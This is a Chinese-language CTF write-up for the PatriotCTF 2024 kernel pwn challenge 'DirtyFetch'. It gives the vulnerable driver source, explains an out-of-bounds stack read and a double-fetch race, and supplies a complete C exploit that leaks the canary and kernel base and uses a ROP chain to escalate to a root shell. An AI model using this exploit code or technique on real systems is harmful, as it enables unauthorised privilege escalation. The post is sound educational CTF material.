---
title: PatriotCTF 2024 WP
date: 2024-09-24 14:07:05
tags: [CTF, PatriotCTF2024, WP]
categories: 
    - CTF
    - PatriotCTF2024
    - Wp
---

# Pwn
## DirtyFetch

### 分析

#### 源码
给了驱动源码：
```C
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#define MAX_SIZE 240

MODULE_LICENSE("GPL");

unsigned long max;
typedef struct data{
	char * content;
    size_t length;
}data;
data * storage;

static int device_open(struct inode* inode, struct file* filp) {
    printk(KERN_ALERT "Opened.\n");
    return 0;
}

static int device_release(struct inode* inode, struct file* filp) {
    if(storage != 0){
        kfree(storage->content);
        kfree(storage);
    }
    printk(KERN_ALERT "Closed.\n");
    return 0;
}

static ssize_t device_read(struct file* filp, char* buf, size_t len, loff_t* off) {
    printk(KERN_ALERT "Unimplemented!");
    return -EINVAL;
}

static ssize_t device_write(struct file* filp, const char* buf, size_t len, loff_t* off) {
    printk(KERN_ALERT "Unimplemented!");
    return -EINVAL;
}

data * get_storage_contents(unsigned long buf){
    data * request = (data *)kmalloc(sizeof(data),GFP_KERNEL);
    if(request == NULL){
        return NULL;
    }
    copy_from_user(request, (data *)buf, sizeof(data));
    char * content = (char *)kmalloc((request->length),GFP_KERNEL);
    if(content == NULL){
        return NULL;
    }
    copy_from_user(content,request->content,request->length);
    memcpy(request, &content, 8);
    return request;
}

int validate_buf(unsigned long buf){
    data * request = get_storage_contents(buf);
    if(request == NULL){
        printk(KERN_ALERT "Error fetching storage from userspace!");
        return -ENOMEM;
    }
    int ret = request->length < MAX_SIZE;
    kfree(request->content);
    kfree(request);
    return ret;
}

static ssize_t edit_storage(unsigned long buf) {
    data * request;
    int ret;
    if(validate_buf(buf)){
        request = get_storage_contents(buf);
        storage = request;
        ret = request->length;
    }else{
        request = NULL;
        printk(KERN_ALERT "Specified size goes out of bounds.");
        ret = -EFAULT;
    }
    return ret;
}

static long device_ioctl(struct file* filp, unsigned int ioctl_num, unsigned long ioctl_param) {
    long ret = -EINVAL;
    char content[MAX_SIZE];

    switch(ioctl_num){
        case 0x10:
            if(ioctl_param > 0){
                max = ioctl_param;
                ret = ioctl_param;
            }else{
                printk(KERN_ALERT "Invalid max");
                ret = -EINVAL;
            }
            break;
        case 0x20:
            if(storage != 0){
                kfree(storage->content);
                kfree(storage);
                storage = 0;
            }
            ssize_t request = edit_storage(ioctl_param);
            if(request == -EFAULT){
                printk(KERN_ALERT "Error copying userspace data!");
            }else{
                printk(KERN_ALERT "Data copied!");
            }
            ret = (long) request;
            break;
        case 0x30:
            if(storage == 0){
                printk(KERN_ALERT "Nothing to save!");
                ret = -EINVAL;
            }else{
                memcpy(content,storage->content,storage->length);
                ret = storage->length;
                printk(KERN_ALERT "Data saved!");
            }
            break;
        case 0x40:
            unsigned long len;
            if(get_user(len, (unsigned long *)ioctl_param) == -EFAULT){
                printk(KERN_ALERT "Error fetching length!");
                ret = -EFAULT;
            }
            if(copy_to_user((char *)ioctl_param, content, len % max) != 0){
                printk(KERN_ALERT "Error reading data!");
                ret = -EFAULT;
            }
            if(ret != -EFAULT){
                ret = len % max;
            }
            break;
        default:
            printk(KERN_ALERT "Invalid command");
    }
    return ret;
}

static struct file_operations fops = {
    .read = device_read,
    .write = device_write,
    .unlocked_ioctl = device_ioctl,
    .open = device_open,
    .release = device_release};

struct proc_dir_entry* proc_entry = NULL;

int init_module(void) {
    max = (unsigned long)MAX_SIZE;
    storage = 0;
    proc_entry = proc_create("vuln", 0666, NULL, &fops);
    printk(KERN_ALERT "Challenge loaded at /proc/vuln, good luck!!\n");
    return 0;
}

void cleanup_module(void) {
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
```


#### 功能分析
- ioctl 0x10可以改写全局变量max的值，该值会在ioctl 0x40用到
- ioctl 0x20会申请堆块然后向内写入数据
- ioctl 0x30可以将写入堆块内部的内容copy到栈内
- ioctl 0x40可以将栈内数据传回用户态

### 漏洞

#### 越界读
ioctl 0x10可以修改max变量的值，然而0x40处的`copy_to_user`的第三个参数又max控制，因此可以泄露容易长度的内核栈数据。

#### 越界写
ioctl 0x20申请堆块后，写入操作会执行两次，首先`validate_buf`会调用`get_storage_contents`写入数据，然后检查数据长度是否小于240，如果小于则返回True，然后`edit_storage`检查`validate_buf`的返回值，如果为True则进行第二次写入。
上述操作可以通过条件竞争改写第二次写入的长度，从而绕过`validate_buf`的长度监测。

### 利用

#### 泄露地址
首先利用oobRead泄露Canary和内核地址
```C
int fd;
typedef struct data
{
    char *content;
    size_t length;
} data;
data storage;
long Setmax(unsigned long size)
{
    return ioctl(fd, 0x10, size);
}

long Leak(char *buf, size_t length)
{

    storage.content = buf;
    storage.length = length;
    return ioctl(fd, 0x40, buf);
}

int main()
{

    fd = open("/proc/vuln", O_RDWR);

    if (Setmax(0x200) != 0x200)
    {
        puts("[+] Set max failed");
        return 0;
    }
    puts("[+] Set max success");
    buffer[0] = 240;
    if (!Leak(buffer, 0xe8))
    {
        puts("[+] Leak failed");
        return 0;
    }
    puts("[+] Leak success");
    unsigned long kernel_leak = buffer[29];
    unsigned long kernel_base = kernel_leak - 0x35691f;
    unsigned long canary = buffer[22];
    size_t swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xc00a2f;
    size_t prepare_kernel_cred = kernel_base + 0x895e0;
    size_t commit_creds = kernel_base + 0x892c0;
    size_t pop_rdi_ret = kernel_base + 0x2c3a;

    printf("kernel leak      : %p\n", kernel_leak);
    printf("kernel base      : %p\n", kernel_base);
    printf("canary           : %p\n", canary);
}
```

#### 条件竞争
然后通过条件竞争写入长度超过240的数据到堆内

```C
int is_running = 1;

long Add(char *buf, size_t length)
{
    storage.content = buf;
    storage.length = length;
    return ioctl(fd, 0x20, &storage);
}


void *ThreadWriteData()
{
    puts("[+] Start Write Data");
    while (is_running)
    {
        size_t ret = Add(buffer1, 100);
        if (ret == 0x200)
        {
            is_running = 0;
            puts("[+] Win race condition");
        }
    }
}

void *ThreadChangeLength()
{
    puts("[+] Start Write Data");
    while (is_running)
    {
        storage.length = 0x200;
    }
}

int main()
{

    fd = open("/proc/vuln", O_RDWR);

    pthread_t tChangeLength;
    pthread_t tWriteData;

    pthread_create(&tChangeLength, NULL, ThreadChangeLength, NULL);
    pthread_create(&tWriteData, NULL, ThreadWriteData, NULL);

    pthread_join(tChangeLength, NULL);
    pthread_join(tWriteData, NULL);

}
```

#### 栈溢出
现在我们可以得到长度超过240的堆块了，通过ioctl 0x40将堆内数据copy到栈内就可以造成栈溢出，完成ROP。

ROP_Chain如下：
```C
    int idx = 0x1e;
    buffer1[idx++] = canary;
    idx++;
    idx++;
    idx++;
    buffer1[idx++] = pop_rdi_ret;
    buffer1[idx++] = 0;
    buffer1[idx++] = prepare_kernel_cred;
    buffer1[idx++] = commit_creds;
    buffer1[idx++] = swapgs_restore_regs_and_return_to_usermode + 22;
    buffer1[idx++] = 0;
    buffer1[idx++] = 0;
    buffer1[idx++] = backdoor;
    buffer1[idx++] = user_cs;
    buffer1[idx++] = user_rflags;
    buffer1[idx++] = user_sp;
    buffer1[idx++] = user_ss;
```

### 完整Exp
```C
#include <stdio.h>      // printf, puts
#include <stdlib.h>     // system
#include <string.h>     // memset
#include <unistd.h>     // open
#include <fcntl.h>      // O_RDWR
#include <sys/ioctl.h>  // ioctl
#include <pthread.h>    // pthread相关函数
#include <sys/types.h>  // size_t

int fd;
typedef struct data
{
    char *content;
    size_t length;
} data;
data storage;
size_t buffer[0x100];
size_t buffer1[0x100];

long Setmax(unsigned long size)
{
    return ioctl(fd, 0x10, size);
}

long Leak(char *buf, size_t length)
{

    storage.content = buf;
    storage.length = length;
    return ioctl(fd, 0x40, buf);
}

long Save()
{
    return ioctl(fd, 0x30, NULL);
}

int is_running = 1;

long Add(char *buf, size_t length)
{
    storage.content = buf;
    storage.length = length;
    return ioctl(fd, 0x20, &storage);
}


void *ThreadWriteData()
{
    puts("[+] Start Write Data");
    while (is_running)
    {
        size_t ret = Add(buffer1, 100);
        if (ret == 0x200)
        {
            is_running = 0;
            puts("[+] Win race condition");
        }
    }
}

void *ThreadChangeLength()
{
    puts("[+] Start Write Data");
    while (is_running)
    {
        storage.length = 0x200;
    }
}

size_t user_sp, user_cs, user_ss, user_rflags;
void save_user_land()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_sp, rsp;"
        "mov user_ss, ss;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved userland registers");
    printf("[#] cs: 0x%lx \n", user_cs);
    printf("[#] ss: 0x%lx \n", user_ss);
    printf("[#] rsp: 0x%lx \n", user_sp);
    printf("[#] rflags: 0x%lx \n\n", user_rflags);
}

void backdoor()
{
    system("id");
    system("/bin/sh");
}

int main()
{

    fd = open("/proc/vuln", O_RDWR);

    if (Setmax(0x200) != 0x200)
    {
        puts("[+] Set max failed");
        return 0;
    }
    puts("[+] Set max success");
    buffer[0] = 240;
    if (!Leak(buffer, 0xe8))
    {
        puts("[+] Leak failed");
        return 0;
    }
    puts("[+] Leak success");
    unsigned long kernel_leak = buffer[29];
    unsigned long kernel_base = kernel_leak - 0x35691f;
    unsigned long canary = buffer[22];
    size_t swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xc00a2f;
    size_t prepare_kernel_cred = kernel_base + 0x895e0;
    size_t commit_creds = kernel_base + 0x892c0;
    size_t pop_rdi_ret = kernel_base + 0x2c3a;

    printf("kernel leak      : %p\n", kernel_leak);
    printf("kernel base      : %p\n", kernel_base);
    printf("canary           : %p\n", canary);
    for (int i = 0; i < 30; i++)
    {
        printf("idx : %d : 0x%llx\n", i, (size_t)buffer[i]);
    }
    save_user_land();
    int idx = 0x1e;
    buffer1[idx++] = canary;
    idx++;
    idx++;
    idx++;
    buffer1[idx++] = pop_rdi_ret;
    buffer1[idx++] = 0;
    buffer1[idx++] = prepare_kernel_cred;
    buffer1[idx++] = commit_creds;
    buffer1[idx++] = swapgs_restore_regs_and_return_to_usermode + 22;
    buffer1[idx++] = 0;
    buffer1[idx++] = 0;
    buffer1[idx++] = backdoor;
    buffer1[idx++] = user_cs;
    buffer1[idx++] = user_rflags;
    buffer1[idx++] = user_sp;
    buffer1[idx++] = user_ss;

    pthread_t tChangeLength;
    pthread_t tWriteData;

    pthread_create(&tChangeLength, NULL, ThreadChangeLength, NULL);
    pthread_create(&tWriteData, NULL, ThreadWriteData, NULL);

    pthread_join(tChangeLength, NULL);
    pthread_join(tWriteData, NULL);


    while (1)
    {
        if (!is_running)
        {
            Save();
            break;
        }
    }
    return 1;
}
```


![](image.png)